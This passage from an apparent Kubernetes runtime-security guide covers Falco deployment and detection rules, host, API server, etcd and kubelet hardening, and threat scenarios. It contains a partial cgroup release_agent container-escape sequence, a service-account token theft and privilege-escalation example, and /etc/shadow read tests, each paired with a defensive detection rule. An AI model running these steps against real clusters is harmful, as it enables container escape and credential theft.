      volumeMounts:\n        - mountPath: /host/var/run/docker.sock\n          name: docker-socket\n        - mountPath: /host/run/containerd/containerd.sock\n          name: containerd-socket\n        - mountPath: /host/run/crio/crio.sock\n          name: crio-socket\n        - mountPath: /host/dev\n          name: dev-fs\n          readOnly: true\n        - mountPath: /host/proc\n          name: proc-fs\n          readOnly: true\n        - mountPath: /host/boot\n          name: boot-fs\n          readOnly: true\n        - mountPath: /host/lib/modules\n          name: lib-modules\n          readOnly: true\n        - mountPath: /host/usr\n          name: usr-fs\n          readOnly: true\n        - mountPath: /etc/falco\n          name: config-volume\n        - mountPath: /var/log/falco\n          name: log-volume\n        resources:\n          requests:\n            cpu: 200m\n            memory: 512Mi\n          limits:\n            cpu: 1000m\n            memory: 1Gi\n      volumes:\n      - name: docker-socket\n        hostPath:\n          path: /var/run/docker.sock\n      - name: containerd-socket\n        hostPath:\n          path: /run/containerd/containerd.sock\n      - name: crio-socket\n        hostPath:\n          path: /run/crio/crio.sock\n      - name: dev-fs\n        hostPath:\n          path: /dev\n      - name: proc-fs\n        hostPath:\n          path: /proc\n      - name: boot-fs\n        hostPath:\n          path: /boot\n      - name: lib-modules\n        hostPath:\n          path: /lib/modules\n      - name: usr-fs\n        hostPath:\n          path: /usr\n      - name: config-volume\n        configMap:\n          name: falco-config\n      - name: log-volume\n        hostPath:\n          path: /var/log/falco\n          type: DirectoryOrCreate\n</code></pre>"},{"location":"11-runtime-security/#23-falco-rules-overview","title":"2.3 Falco Rules Overview","text":"<p>Rule Structure:</p> <pre><code># Rule anatomy\n- rule: Rule Name\n  desc: Description of what this rule detects\n  condition: (evt.type = open and fd.name = /etc/shadow)\n  output: \"Suspicious file opened (user=%user.name command=%proc.cmdline file=%fd.name container=%container.name)\"\n  priority: WARNING\n  tags: [filesystem, mitre_credential_access]\n</code></pre> <p>Default Rules Categories:</p> <ol> <li>Process Execution</li> <li>Unexpected processes in containers</li> <li>Privilege escalation attempts</li> <li> <p>Shell spawned in container</p> </li> <li> <p>File System Access</p> </li> <li>Sensitive file reads</li> <li>Write to system directories</li> <li> <p>Binary modifications</p> </li> <li> <p>Network Activity</p> </li> <li>Unexpected outbound connections</li> <li>Reverse shell detection</li> <li> <p>C2 communication patterns</p> </li> <li> <p>System Calls</p> </li> <li>Dangerous syscalls (ptrace, mount)</li> <li>Container runtime interaction</li> <li>Kernel module loading</li> </ol>"},{"location":"11-runtime-security/#24-testing-falco-detection","title":"2.4 Testing Falco Detection","text":"<p>Test 1: Shell in Container</p> <pre><code># This should trigger \"Terminal shell in container\"\nkubectl run test-shell --image=nginx -it --rm -- /bin/bash\n\n# Check Falco logs\nkubectl logs -n falco -l app=falco | grep \"Terminal shell\"\n</code></pre> <p>Test 2: Read Sensitive File</p> <pre><code># Create a pod that reads /etc/shadow\nkubectl run test-shadow --image=busybox --rm -it -- cat /etc/shadow\n\n# Check Falco logs\nkubectl logs -n falco -l app=falco | grep \"shadow\"\n</code></pre> <p>Test 3: Network Connection</p> <pre><code># Spawn a pod and make outbound connection\nkubectl run test-network --image=nicolaka/netshoot --rm -it -- curl http://example.com\n\n# Check Falco logs\nkubectl logs -n falco -l app=falco | grep \"Outbound\"\n</code></pre>"},{"location":"11-runtime-security/#3-custom-falco-rules-for-kubernetes","title":"3. Custom Falco Rules for Kubernetes","text":""},{"location":"11-runtime-security/#31-creating-application-specific-rules","title":"3.1 Creating Application-Specific Rules","text":"<p>Example 1: Detect Unauthorized Database Access</p> <pre><code># custom-rules.yaml\n- rule: Unauthorized Database Access Attempt\n  desc: Detect connection attempts to database from non-whitelisted pods\n  condition: &gt;\n    evt.type = connect and\n    fd.sip != \"0.0.0.0\" and\n    fd.sport = 5432 and\n    not k8s.pod.label.app in (api-server, backend-service)\n  output: &gt;\n    Unauthorized pod attempting database connection\n    (pod=%k8s.pod.name namespace=%k8s.ns.name\n    source=%fd.cip:%fd.cport dest=%fd.sip:%fd.sport\n    user=%user.name command=%proc.cmdline)\n  priority: CRITICAL\n  tags: [database, access_control, network]\n\n- rule: Database Admin Command Executed\n  desc: Detect execution of database admin commands in production\n  condition: &gt;\n    spawned_process and\n    k8s.ns.name = \"production\" and\n    proc.name in (psql, mysql, mongosh) and\n    (proc.args contains \"DROP\" or\n     proc.args contains \"DELETE\" or\n     proc.args contains \"TRUNCATE\" or\n     proc.args contains \"ALTER\")\n  output: &gt;\n    Dangerous database command executed in production\n    (command=%proc.cmdline user=%user.name pod=%k8s.pod.name\n    namespace=%k8s.ns.name container=%container.name)\n  priority: CRITICAL\n  tags: [database, production, data_integrity]\n</code></pre> <p>Example 2: Detect Crypto Mining</p> <pre><code>- rule: Cryptocurrency Mining Activity Detected\n  desc: Detect common cryptocurrency mining tools and patterns\n  condition: &gt;\n    spawned_process and\n    (proc.name in (xmrig, ethminer, cgminer, minerd, cpuminer) or\n     proc.cmdline contains \"stratum+tcp\" or\n     proc.cmdline contains \"cryptonight\" or\n     proc.cmdline contains \"randomx\")\n  output: &gt;\n    Cryptocurrency mining detected\n    (process=%proc.name command=%proc.cmdline\n    user=%user.name container=%container.name\n    pod=%k8s.pod.name namespace=%k8s.ns.name)\n  priority: CRITICAL\n  tags: [malware, crypto_mining, resource_abuse]\n\n- rule: Suspicious CPU Usage Pattern\n  desc: Detect sustained high CPU usage typical of mining\n  condition: &gt;\n    evt.type = procexit and\n    evt.cpu.usage &gt; 90 and\n    evt.duration &gt; 300000000000\n  output: &gt;\n    Suspicious sustained high CPU usage\n    (process=%proc.name cpu=%evt.cpu.usage duration=%evt.duration\n    container=%container.name pod=%k8s.pod.name)\n  priority: WARNING\n  tags: [performance, crypto_mining]\n</code></pre> <p>Example 3: Detect Secret Access</p> <pre><code>- rule: Secret File Read by Unprivileged Container\n  desc: Detect reading of Kubernetes secret files by non-system pods\n  condition: &gt;\n    open_read and\n    fd.name glob \"/var/run/secrets/kubernetes.io/serviceaccount/*\" and\n    not k8s.pod.name startswith \"kube-\" and\n    not k8s.ns.name in (kube-system, kube-public, kube-node-lease)\n  output: &gt;\n    Unprivileged pod reading Kubernetes secrets\n    (file=%fd.name pod=%k8s.pod.name namespace=%k8s.ns.name\n    user=%user.name command=%proc.cmdline)\n  priority: WARNING\n  tags: [credentials, secrets, kubernetes]\n\n- rule: Environment Variable Dump Attempt\n  desc: Detect attempts to dump environment variables containing secrets\n  condition: &gt;\n    spawned_process and\n    (proc.cmdline contains \"printenv\" or\n     proc.cmdline contains \"env\" or\n     proc.cmdline contains \"set\") and\n    proc.pname in (bash, sh, dash, zsh)\n  output: &gt;\n    Possible environment variable enumeration\n    (command=%proc.cmdline container=%container.name\n    pod=%k8s.pod.name namespace=%k8s.ns.name)\n  priority: INFO\n  tags: [credentials, enumeration]\n</code></pre> <p>Example 4: Kubernetes Security Context</p> <pre><code>- rule: Pod with Dangerous Capabilities Started\n  desc: Detect pods starting with dangerous Linux capabilities\n  condition: &gt;\n    evt.type = container and\n    container.privileged = false and\n    (container.cap_permitted contains CAP_SYS_ADMIN or\n     container.cap_permitted contains CAP_SYS_PTRACE or\n     container.cap_permitted contains CAP_SYS_MODULE or\n     container.cap_permitted contains CAP_DAC_READ_SEARCH or\n     container.cap_permitted contains CAP_DAC_OVERRIDE)\n  output: &gt;\n    Container started with dangerous capabilities\n    (capabilities=%container.cap_permitted\n    container=%container.name pod=%k8s.pod.name\n    namespace=%k8s.ns.name image=%container.image)\n  priority: WARNING\n  tags: [container, capabilities, privilege]\n\n- rule: HostPath Volume Mount Detected\n  desc: Detect containers mounting sensitive host paths\n  condition: &gt;\n    evt.type = container and\n    (container.mount contains \"/var/run/docker.sock\" or\n     container.mount contains \"/proc\" or\n     container.mount contains \"/sys\" or\n     container.mount contains \"/etc\" or\n     container.mount contains \"/root\" or\n     container.mount contains \"/boot\")\n  output: &gt;\n    Container with sensitive host path mount\n    (mount=%container.mount container=%container.name\n    pod=%k8s.pod.name namespace=%k8s.ns.name)\n  priority: CRITICAL\n  tags: [container, volumes, host_access]\n</code></pre>"},{"location":"11-runtime-security/#32-deploying-custom-rules","title":"3.2 Deploying Custom Rules","text":"<pre><code># Create ConfigMap with custom rules\nkubectl create configmap falco-custom-rules \\\n  --from-file=custom-rules.yaml \\\n  -n falco\n\n# Update Falco DaemonSet to mount custom rules\nkubectl patch daemonset falco -n falco --type=json -p='[\n  {\n    \"op\": \"add\",\n    \"path\": \"/spec/template/spec/volumes/-\",\n    \"value\": {\n      \"name\": \"custom-rules\",\n      \"configMap\": {\"name\": \"falco-custom-rules\"}\n    }\n  },\n  {\n    \"op\": \"add\",\n    \"path\": \"/spec/template/spec/containers/0/volumeMounts/-\",\n    \"value\": {\n      \"name\": \"custom-rules\",\n      \"mountPath\": \"/etc/falco/rules.d\"\n    }\n  }\n]'\n\n# Restart Falco to load new rules\nkubectl rollout restart daemonset/falco -n falco\n</code></pre>"},{"location":"11-runtime-security/#33-rule-tuning-and-optimization","title":"3.3 Rule Tuning and Optimization","text":"<p>Reducing False Positives:</p> <pre><code># Use exception lists\n- list: allowed_shell_containers\n  items: [debug-pod, troubleshooting, admin-tools]\n\n- rule: Shell Spawned in Container (Optimized)\n  desc: A shell was spawned in a container (with exceptions)\n  condition: &gt;\n    spawned_process and\n    container and\n    proc.name in (bash, sh, dash, zsh) and\n    not k8s.pod.name in (allowed_shell_containers) and\n    not k8s.ns.name in (kube-system, development, testing)\n  output: Shell spawned (pod=%k8s.pod.name command=%proc.cmdline)\n  priority: WARNING\n  tags: [shell, container]\n</code></pre> <p>Rule Performance Considerations:</p> <ol> <li>Use specific conditions - Avoid broad rules that match frequently</li> <li>Leverage indexes - Use indexed fields (evt.type, fd.name)</li> <li>Order conditions - Put most selective conditions first</li> <li>Use lists for reusability - Create macro lists for common patterns</li> <li>Test in dev first - Validate rules before production deployment</li> </ol>"},{"location":"11-runtime-security/#4-host-hardening","title":"4. Host Hardening","text":""},{"location":"11-runtime-security/#41-kernel-security-parameters","title":"4.1 Kernel Security Parameters","text":"<p>Sysctl Hardening Configuration:</p> <pre><code># /etc/sysctl.d/99-kubernetes-hardening.conf\n\n# Kernel hardening\nkernel.kptr_restrict = 2                    # Hide kernel pointers\nkernel.dmesg_restrict = 1                   # Restrict dmesg access\nkernel.yama.ptrace_scope = 1                # Restrict ptrace\nkernel.perf_event_paranoid = 3              # Restrict perf events\nkernel.unprivileged_bpf_disabled = 1        # Disable unprivileged eBPF\nkernel.kexec_load_disabled = 1              # Disable kexec\nkernel.modules_disabled = 1                 # Disable module loading (after boot)\nkernel.sysrq = 0                            # Disable SysRq\n\n# Network security\nnet.ipv4.conf.all.rp_filter = 1             # Enable reverse path filtering\nnet.ipv4.conf.default.rp_filter = 1\nnet.ipv4.conf.all.accept_source_route = 0   # Disable source routing\nnet.ipv4.conf.default.accept_source_route = 0\nnet.ipv6.conf.all.accept_source_route = 0\nnet.ipv6.conf.default.accept_source_route = 0\nnet.ipv4.conf.all.send_redirects = 0        # Disable ICMP redirects\nnet.ipv4.conf.default.send_redirects = 0\nnet.ipv4.conf.all.accept_redirects = 0\nnet.ipv4.conf.default.accept_redirects = 0\nnet.ipv6.conf.all.accept_redirects = 0\nnet.ipv6.conf.default.accept_redirects = 0\nnet.ipv4.conf.all.secure_redirects = 0\nnet.ipv4.conf.default.secure_redirects = 0\nnet.ipv4.icmp_echo_ignore_broadcasts = 1    # Ignore broadcast pings\nnet.ipv4.icmp_ignore_bogus_error_responses = 1\nnet.ipv4.tcp_syncookies = 1                 # Enable SYN flood protection\nnet.ipv4.tcp_timestamps = 0                 # Disable TCP timestamps\nnet.ipv4.conf.all.log_martians = 1          # Log suspicious packets\nnet.ipv4.conf.default.log_martians = 1\nnet.ipv6.conf.all.disable_ipv6 = 0          # Keep IPv6 enabled if needed\nnet.ipv6.conf.all.forwarding = 1            # Required for Kubernetes\n\n# Memory and process limits\nvm.overcommit_memory = 1                    # Required for Redis, Kubernetes\nvm.panic_on_oom = 0                         # Don't panic on OOM\nvm.swappiness = 0                           # Minimize swap usage\nfs.file-max = 2097152                       # Increase file descriptors\nfs.inotify.max_user_watches = 524288        # For large clusters\nfs.inotify.max_user_instances = 512\n\n# Apply settings\nsudo sysctl -p /etc/sysctl.d/99-kubernetes-hardening.conf\n</code></pre>"},{"location":"11-runtime-security/#42-apparmor-profiles","title":"4.2 AppArmor Profiles","text":"<p>Kubernetes Node AppArmor Profile:</p> <pre><code># /etc/apparmor.d/kubernetes-node\n\n#include &lt;tunables/global&gt;\n\nprofile kubernetes-node flags=(attach_disconnected,mediate_deleted) {\n  #include &lt;abstractions/base&gt;\n\n  # Allow necessary operations\n  network,\n  capability,\n\n  # File system restrictions\n  /etc/kubernetes/** r,\n  /var/lib/kubelet/** rw,\n  /var/lib/etcd/** rw,\n  /var/log/** w,\n  /run/containerd/** rw,\n  /run/kubernetes/** rw,\n  /opt/cni/bin/** ix,\n\n  # Deny dangerous operations\n  deny /proc/sys/kernel/core_pattern w,\n  deny /proc/sysrq-trigger w,\n  deny /proc/sys/net/** w,\n  deny /sys/devices/virtual/powercap/** w,\n\n  # Block access to sensitive files\n  deny /etc/shadow r,\n  deny /etc/gshadow r,\n  deny /root/.ssh/** r,\n\n  # Container runtime\n  /usr/bin/containerd ix,\n  /usr/bin/runc ix,\n\n  # Kubernetes binaries\n  /usr/bin/kubelet ix,\n  /usr/bin/kubectl ix,\n}\n\n# Load profile\nsudo apparmor_parser -r /etc/apparmor.d/kubernetes-node\n</code></pre>"},{"location":"11-runtime-security/#43-selinux-policies","title":"4.3 SELinux Policies","text":"<p>SELinux Configuration for Kubernetes:</p> <pre><code># Set SELinux to enforcing\nsudo setenforce 1\n\n# Ensure persistent setting\nsudo sed -i 's/^SELINUX=.*/SELINUX=enforcing/' /etc/selinux/config\n\n# Kubernetes-specific SELinux booleans\nsudo setsebool -P container_manage_cgroup on\nsudo setsebool -P virt_use_nfs on\nsudo setsebool -P virt_sandbox_use_all_caps on\n\n# Custom SELinux policy for Kubernetes (kubernetes.te)\nmodule kubernetes 1.0;\n\nrequire {\n    type container_t;\n    type container_runtime_t;\n    type svirt_sandbox_file_t;\n    class file { read write open };\n    class capability { sys_admin net_admin };\n}\n\n# Allow container runtime to manage containers\nallow container_runtime_t container_t:process { transition signal kill };\nallow container_runtime_t svirt_sandbox_file_t:file { read write open };\nallow container_t self:capability { sys_admin net_admin };\n\n# Compile and load policy\ncheckmodule -M -m -o kubernetes.mod kubernetes.te\nsemodule_package -o kubernetes.pp -m kubernetes.mod\nsudo semodule -i kubernetes.pp\n</code></pre>"},{"location":"11-runtime-security/#44-secure-boot-and-kernel-configuration","title":"4.4 Secure Boot and Kernel Configuration","text":"<p>GRUB Configuration Hardening:</p> <pre><code># /etc/default/grub additions\n\n# Enable kernel hardening features\nGRUB_CMDLINE_LINUX=\"audit=1 audit_backlog_limit=8192 slub_debug=P page_poison=1 vsyscall=none\"\n\n# Update GRUB\nsudo update-grub  # Debian/Ubuntu\nsudo grub2-mkconfig -o /boot/grub2/grub.cfg  # RHEL/CentOS\n</code></pre>"},{"location":"11-runtime-security/#5-api-server-hardening","title":"5. API Server Hardening","text":""},{"location":"11-runtime-security/#51-authentication-configuration","title":"5.1 Authentication Configuration","text":"<p>Advanced API Server Authentication:</p> <pre><code># /etc/kubernetes/manifests/kube-apiserver.yaml\napiVersion: v1\nkind: Pod\nmetadata:\n  name: kube-apiserver\n  namespace: kube-system\nspec:\n  containers:\n  - name: kube-apiserver\n    command:\n    - kube-apiserver\n\n    # Authentication\n    - --anonymous-auth=false\n    - --client-ca-file=/etc/kubernetes/pki/ca.crt\n    - --token-auth-file=/etc/kubernetes/pki/tokens.csv\n    - --oidc-issuer-url=https://accounts.example.com\n    - --oidc-client-id=kubernetes\n    - --oidc-username-claim=email\n    - --oidc-groups-claim=groups\n    - --oidc-ca-file=/etc/kubernetes/pki/oidc-ca.crt\n    - --service-account-key-file=/etc/kubernetes/pki/sa.pub\n    - --service-account-signing-key-file=/etc/kubernetes/pki/sa.key\n    - --service-account-issuer=https://kubernetes.default.svc.cluster.local\n\n    # Authorization\n    - --authorization-mode=Node,RBAC\n    - --enable-admission-plugins=NodeRestriction,PodSecurityPolicy,PodSecurityAdmission,AlwaysPullImages,SecurityContextDeny,EventRateLimit,ValidatingAdmissionWebhook,MutatingAdmissionWebhook\n\n    # Audit logging\n    - --audit-log-path=/var/log/kubernetes/audit.log\n    - --audit-log-maxage=30\n    - --audit-log-maxbackup=10\n    - --audit-log-maxsize=100\n    - --audit-policy-file=/etc/kubernetes/audit-policy.yaml\n    - --audit-webhook-config-file=/etc/kubernetes/audit-webhook.yaml\n    - --audit-webhook-batch-max-size=100\n\n    # Encryption at rest\n    - --encryption-provider-config=/etc/kubernetes/encryption-config.yaml\n\n    # TLS configuration\n    - --tls-cert-file=/etc/kubernetes/pki/apiserver.crt\n    - --tls-private-key-file=/etc/kubernetes/pki/apiserver.key\n    - --tls-min-version=VersionTLS13\n    - --tls-cipher-suites=TLS_AES_128_GCM_SHA256,TLS_AES_256_GCM_SHA384,TLS_CHACHA20_POLY1305_SHA256\n\n    # Security\n    - --insecure-port=0\n    - --secure-port=6443\n    - --bind-address=0.0.0.0\n    - --profiling=false\n    - --enable-bootstrap-token-auth=false\n    - --kubelet-certificate-authority=/etc/kubernetes/pki/ca.crt\n    - --kubelet-client-certificate=/etc/kubernetes/pki/apiserver-kubelet-client.crt\n    - --kubelet-client-key=/etc/kubernetes/pki/apiserver-kubelet-client.key\n    - --requestheader-client-ca-file=/etc/kubernetes/pki/front-proxy-ca.crt\n    - --proxy-client-cert-file=/etc/kubernetes/pki/front-proxy-client.crt\n    - --proxy-client-key-file=/etc/kubernetes/pki/front-proxy-client.key\n\n    # Rate limiting\n    - --max-requests-inflight=400\n    - --max-mutating-requests-inflight=200\n    - --event-ttl=1h\n</code></pre>"},{"location":"11-runtime-security/#52-api-server-network-security","title":"5.2 API Server Network Security","text":"<p>Firewall Rules for API Server:</p> <pre><code>#!/bin/bash\n# api-server-firewall.sh\n\n# Flush existing rules\niptables -F\niptables -X\n\n# Default policies\niptables -P INPUT DROP\niptables -P FORWARD DROP\niptables -P OUTPUT ACCEPT\n\n# Allow loopback\niptables -A INPUT -i lo -j ACCEPT\n\n# Allow established connections\niptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\n\n# Allow API server port from control plane nodes only\niptables -A INPUT -p tcp --dport 6443 -s 10.0.1.0/24 -j ACCEPT\n\n# Allow etcd communication between control plane nodes\niptables -A INPUT -p tcp --dport 2379:2380 -s 10.0.1.0/24 -j ACCEPT\n\n# Allow kubelet API from control plane\niptables -A INPUT -p tcp --dport 10250 -s 10.0.1.0/24 -j ACCEPT\n\n# Drop everything else\niptables -A INPUT -j LOG --log-prefix \"IPTABLES-DROPPED: \"\niptables -A INPUT -j DROP\n\n# Save rules\niptables-save &gt; /etc/iptables/rules.v4\n</code></pre>"},{"location":"11-runtime-security/#53-admission-control-hardening","title":"5.3 Admission Control Hardening","text":"<p>Event Rate Limit Configuration:</p> <pre><code># /etc/kubernetes/eventconfig.yaml\napiVersion: eventratelimit.admission.k8s.io/v1alpha1\nkind: Configuration\nlimits:\n- type: Namespace\n  qps: 50\n  burst: 100\n  cacheSize: 2000\n- type: User\n  qps: 10\n  burst: 50\n- type: Server\n  qps: 5000\n  burst: 20000\n</code></pre>"},{"location":"11-runtime-security/#6-etcd-security","title":"6. etcd Security","text":""},{"location":"11-runtime-security/#61-etcd-tls-configuration","title":"6.1 etcd TLS Configuration","text":"<p>etcd with mTLS:</p> <pre><code># /etc/kubernetes/manifests/etcd.yaml\napiVersion: v1\nkind: Pod\nmetadata:\n  name: etcd\n  namespace: kube-system\nspec:\n  containers:\n  - name: etcd\n    image: registry.k8s.io/etcd:3.5.12-0\n    command:\n    - etcd\n    - --name=etcd-1\n    - --data-dir=/var/lib/etcd\n\n    # Client TLS\n    - --cert-file=/etc/kubernetes/pki/etcd/server.crt\n    - --key-file=/etc/kubernetes/pki/etcd/server.key\n    - --client-cert-auth=true\n    - --trusted-ca-file=/etc/kubernetes/pki/etcd/ca.crt\n    - --listen-client-urls=https://0.0.0.0:2379\n    - --advertise-client-urls=https://10.0.1.10:2379\n\n    # Peer TLS\n    - --peer-cert-file=/etc/kubernetes/pki/etcd/peer.crt\n    - --peer-key-file=/etc/kubernetes/pki/etcd/peer.key\n    - --peer-client-cert-auth=true\n    - --peer-trusted-ca-file=/etc/kubernetes/pki/etcd/ca.crt\n    - --listen-peer-urls=https://0.0.0.0:2380\n    - --initial-advertise-peer-urls=https://10.0.1.10:2380\n\n    # Cluster configuration\n    - --initial-cluster=etcd-1=https://10.0.1.10:2380,etcd-2=https://10.0.1.11:2380,etcd-3=https://10.0.1.12:2380\n    - --initial-cluster-state=new\n    - --initial-cluster-token=etcd-cluster-1\n\n    # Security\n    - --cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384\n    - --auto-tls=false\n    - --peer-auto-tls=false\n\n    # Performance and reliability\n    - --heartbeat-interval=100\n    - --election-timeout=1000\n    - --snapshot-count=10000\n    - --max-snapshots=5\n    - --max-wals=5\n    - --quota-backend-bytes=8589934592  # 8GB\n\n    volumeMounts:\n    - name: etcd-data\n      mountPath: /var/lib/etcd\n    - name: etcd-certs\n      mountPath: /etc/kubernetes/pki/etcd\n      readOnly: true\n\n  hostNetwork: true\n  volumes:\n  - name: etcd-data\n    hostPath:\n      path: /var/lib/etcd\n      type: DirectoryOrCreate\n  - name: etcd-certs\n    hostPath:\n      path: /etc/kubernetes/pki/etcd\n      type: Directory\n</code></pre>"},{"location":"11-runtime-security/#62-encryption-at-rest","title":"6.2 Encryption at Rest","text":"<p>Encryption Configuration:</p> <pre><code># /etc/kubernetes/encryption-config.yaml\napiVersion: apiserver.config.k8s.io/v1\nkind: EncryptionConfiguration\nresources:\n  - resources:\n      - secrets\n      - configmaps\n    providers:\n      # Use KMS provider (recommended for production)\n      - kms:\n          name: aws-kms\n          endpoint: unix:///var/run/kmsplugin/socket.sock\n          cachesize: 1000\n          timeout: 3s\n      # Fallback to AES-CBC\n      - aescbc:\n          keys:\n            - name: key1\n              secret: &lt;base64-encoded-32-byte-key&gt;\n            - name: key2\n              secret: &lt;base64-encoded-32-byte-key&gt;\n      # Identity provider for reading old unencrypted data\n      - identity: {}\n</code></pre> <p>Generate encryption keys:</p> <pre><code># Generate 32-byte random key\nhead -c 32 /dev/urandom | base64\n\n# Update encryption config\nkubectl --kubeconfig=/etc/kubernetes/admin.conf \\\n  create secret generic encryption-config \\\n  --from-file=/etc/kubernetes/encryption-config.yaml \\\n  -n kube-system\n\n# Restart API server to apply\nsudo systemctl restart kubelet\n</code></pre> <p>Verify encryption:</p> <pre><code># Create a test secret\nkubectl create secret generic test-secret --from-literal=key=value\n\n# Read from etcd directly\nETCDCTL_API=3 etcdctl \\\n  --endpoints=https://127.0.0.1:2379 \\\n  --cacert=/etc/kubernetes/pki/etcd/ca.crt \\\n  --cert=/etc/kubernetes/pki/etcd/server.crt \\\n  --key=/etc/kubernetes/pki/etcd/server.key \\\n  get /registry/secrets/default/test-secret | hexdump -C\n\n# Should see encrypted data, not plaintext \"value\"\n</code></pre>"},{"location":"11-runtime-security/#63-etcd-access-control","title":"6.3 etcd Access Control","text":"<p>etcd RBAC Configuration:</p> <pre><code># Enable etcd authentication\netcdctl --endpoints=https://127.0.0.1:2379 \\\n  --cacert=/etc/kubernetes/pki/etcd/ca.crt \\\n  --cert=/etc/kubernetes/pki/etcd/server.crt \\\n  --key=/etc/kubernetes/pki/etcd/server.key \\\n  auth enable\n\n# Create root user\netcdctl --endpoints=https://127.0.0.1:2379 \\\n  --cacert=/etc/kubernetes/pki/etcd/ca.crt \\\n  --cert=/etc/kubernetes/pki/etcd/server.crt \\\n  --key=/etc/kubernetes/pki/etcd/server.key \\\n  user add root --interactive\n\n# Create API server user\netcdctl --endpoints=https://127.0.0.1:2379 \\\n  --cacert=/etc/kubernetes/pki/etcd/ca.crt \\\n  --cert=/etc/kubernetes/pki/etcd/server.crt \\\n  --key=/etc/kubernetes/pki/etcd/server.key \\\n  user add apiserver --no-password\n\n# Create role for API server\netcdctl --endpoints=https://127.0.0.1:2379 \\\n  --cacert=/etc/kubernetes/pki/etcd/ca.crt \\\n  --cert=/etc/kubernetes/pki/etcd/server.crt \\\n  --key=/etc/kubernetes/pki/etcd/server.key \\\n  role add apiserver-role\n\n# Grant permissions\netcdctl --endpoints=https://127.0.0.1:2379 \\\n  --cacert=/etc/kubernetes/pki/etcd/ca.crt \\\n  --cert=/etc/kubernetes/pki/etcd/server.crt \\\n  --key=/etc/kubernetes/pki/etcd/server.key \\\n  role grant-permission apiserver-role readwrite /registry/\n\n# Assign role to user\netcdctl --endpoints=https://127.0.0.1:2379 \\\n  --cacert=/etc/kubernetes/pki/etcd/ca.crt \\\n  --cert=/etc/kubernetes/pki/etcd/server.crt \\\n  --key=/etc/kubernetes/pki/etcd/server.key \\\n  user grant-role apiserver apiserver-role\n</code></pre>"},{"location":"11-runtime-security/#7-kubelet-security-hardening","title":"7. Kubelet Security Hardening","text":""},{"location":"11-runtime-security/#71-kubelet-configuration","title":"7.1 Kubelet Configuration","text":"<p>Hardened kubelet config:</p> <pre><code># /var/lib/kubelet/config.yaml\napiVersion: kubelet.config.k8s.io/v1beta1\nkind: KubeletConfiguration\n\n# Authentication\nauthentication:\n  anonymous:\n    enabled: false\n  webhook:\n    enabled: true\n    cacheTTL: 2m0s\n  x509:\n    clientCAFile: /etc/kubernetes/pki/ca.crt\n\n# Authorization\nauthorization:\n  mode: Webhook\n  webhook:\n    cacheAuthorizedTTL: 5m0s\n    cacheUnauthorizedTTL: 30s\n\n# TLS\ntlsCertFile: /var/lib/kubelet/pki/kubelet.crt\ntlsPrivateKeyFile: /var/lib/kubelet/pki/kubelet.key\ntlsMinVersion: VersionTLS13\ntlsCipherSuites:\n  - TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256\n  - TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256\n  - TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384\n  - TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384\n\n# Security\nprotectKernelDefaults: true\nmakeIPTablesUtilChains: true\nreadOnlyPort: 0\nstreamingConnectionIdleTimeout: 4h0m0s\neventRecordQPS: 5\nenableDebuggingHandlers: false\nrotateCertificates: true\nserverTLSBootstrap: true\n\n# Resource management\ncgroupDriver: systemd\nfeatureGates:\n  RotateKubeletServerCertificate: true\n  SeccompDefault: true\n\n# Eviction policies\nevictionHard:\n  memory.available: \"100Mi\"\n  nodefs.available: \"10%\"\n  nodefs.inodesFree: \"5%\"\n  imagefs.available: \"15%\"\nevictionSoft:\n  memory.available: \"200Mi\"\n  nodefs.available: \"15%\"\n  nodefs.inodesFree: \"10%\"\n  imagefs.available: \"20%\"\nevictionSoftGracePeriod:\n  memory.available: \"1m30s\"\n  nodefs.available: \"2m\"\n  nodefs.inodesFree: \"2m\"\n  imagefs.available: \"2m\"\n\n# Image policy\nimageMinimumGCAge: 2m\nimageGCHighThresholdPercent: 85\nimageGCLowThresholdPercent: 80\n</code></pre>"},{"location":"11-runtime-security/#72-kubelet-startup-flags","title":"7.2 Kubelet Startup Flags","text":"<pre><code># /etc/systemd/system/kubelet.service.d/10-kubeadm.conf\n[Service]\nEnvironment=\"KUBELET_EXTRA_ARGS=--protect-kernel-defaults=true --tls-cipher-suites=TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 --event-qps=0\"\n\nExecStart=\nExecStart=/usr/bin/kubelet \\\n  --bootstrap-kubeconfig=/etc/kubernetes/bootstrap-kubelet.conf \\\n  --kubeconfig=/etc/kubernetes/kubelet.conf \\\n  --config=/var/lib/kubelet/config.yaml \\\n  --container-runtime-endpoint=unix:///var/run/containerd/containerd.sock \\\n  --pod-infra-container-image=registry.k8s.io/pause:3.9\n\n[Install]\nWantedBy=multi-user.target\n</code></pre>"},{"location":"11-runtime-security/#8-real-world-threat-scenarios","title":"8. Real-World Threat Scenarios","text":""},{"location":"11-runtime-security/#81-scenario-1-container-escape-attempt","title":"8.1 Scenario 1: Container Escape Attempt","text":"<p>Attack: <pre><code># Attacker gains shell in privileged container\nkubectl run evil --image=ubuntu --privileged=true -it -- bash\n\n# Inside container, attempt escape via host filesystem\nmkdir /tmp/cgrp &amp;&amp; mount -t cgroup -o memory cgroup /tmp/cgrp\necho 1 &gt; /tmp/cgrp/notify_on_release\nhost_path=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab`\necho \"$host_path/exploit\" &gt; /tmp/cgrp/release_agent\n</code></pre></p> <p>Detection (Falco Rule): <pre><code>- rule: Container Escape via cgroup release_agent\n  desc: Detect container escape attempt using cgroup release_agent\n  condition: &gt;\n    open_write and\n    container and\n    fd.name glob \"*release_agent*\"\n  output: &gt;\n    Container escape attempt detected via cgroup\n    (file=%fd.name command=%proc.cmdline\n    container=%container.name pod=%k8s.pod.name)\n  priority: CRITICAL\n  tags: [container_escape, privilege_escalation]\n</code></pre></p>"},{"location":"11-runtime-security/#82-scenario-2-credential-theft","title":"8.2 Scenario 2: Credential Theft","text":"<p>Attack: <pre><code># Steal service account token\nkubectl exec -it app-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/token\n\n# Use token to escalate privileges\nkubectl --token=$TOKEN auth can-i --list\nkubectl --token=$TOKEN create clusterrolebinding ...\n</code></pre></p> <p>Detection: <pre><code>- rule: Service Account Token Read by Shell\n  desc: Detect shell 